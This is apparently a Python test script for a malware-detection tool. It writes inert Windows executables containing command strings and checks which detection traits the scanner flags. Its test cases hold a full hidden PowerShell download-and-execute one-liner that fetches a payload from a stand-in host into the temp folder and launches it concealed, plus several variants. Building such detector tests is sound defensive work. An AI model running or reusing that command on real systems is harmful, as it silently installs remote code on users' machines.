"""Generate inert PE string controls; never execute the embedded commands.

Run: python3 testdata/native-powershell-temp-exe/verify.py <scratch-directory>
"""
import json
import os
from pathlib import Path
import runpy
import subprocess
import sys

ROOT = Path(__file__).resolve().parents[2]
pe_image = runpy.run_path(str(ROOT / 'testdata/native-rat-loader-triage/verify.py'))['pe_image']
CHAIN = 'micro-behaviors/process/deploy::powershell-download-launch-same-temp-exe'
PAYLOAD = 'objectives/execution/payload/file-exec::native-hidden-powershell-temp-exe-launch'
HIDDEN = 'objectives/evasion/process/hidden/execution::nested-hidden-powershell-temp-payload'
OLD_CHANNEL = 'objectives/command-and-control/channel/http/transport::native-direct-ip-http-channel-with-hidden-powershell-fetch'


def main():
    dest = Path(sys.argv[1])
    dest.mkdir(parents=True, exist_ok=True)
    base = ('start /min cmd.exe /c powershell -WindowStyle Hidden -Command "& { '
            "iwr -Uri 'https://updates.example/payload' -OutFile $env:TEMP\\stage.exe; "
            'Start-Process -FilePath $env:TEMP\\stage.exe -WindowStyle Hidden }"')
    cases = {
        'concealed.exe': (base, True, True),
        'renamed.exe': (base.replace('stage.exe', 'different-name_42.exe'), True, True),
        'full-cmdlet.exe': (base.replace('iwr ', 'Invoke-WebRequest '), True, True),
        'case-varied.exe': (base.replace('iwr ', 'IWR ').replace('-FilePath $env:TEMP\\stage.exe',
                           '-FilePath $ENV:temp\\STAGE.EXE'), True, True),
        'other-target.exe': (base.replace('-FilePath $env:TEMP\\stage.exe',
                            '-FilePath $env:TEMP\\other.exe'), False, False),
        'other-directory.exe': (base.replace('-FilePath $env:TEMP', '-FilePath $env:TMP'), False, False),
        'visible-updater.exe': (base.replace('start /min ', '').replace('-WindowStyle Hidden ', ''), True, False),
        'url-only.exe': ('http://26.69.113.147:2195/', False, False),
    }
    for name, (command, linked, hostile) in cases.items():
        path = dest / name
        path.write_bytes(pe_image(data=command.encode()+b'\0'))
        result = subprocess.run([os.environ.get('CLEAVE', 'cleave'), '--traits-dir', str(ROOT),
                                 '--format', 'json', str(path)], check=True, capture_output=True)
        report = json.loads(result.stdout)
        traits = report['files'][0]['traits']
        ids = {t['id'] for t in traits}
        high = {t['id'] for t in traits if t['crit'] == 5}
        assert (CHAIN in ids) == linked, (name, ids)
        assert (PAYLOAD in high) == hostile, (name, high)
        assert (HIDDEN in high) == hostile, (name, high)
        assert OLD_CHANNEL not in ids, (name, ids)
        if not hostile:
            assert not high, (name, high)
        print('PASS', name, flush=True)


if __name__ == '__main__':
    main()
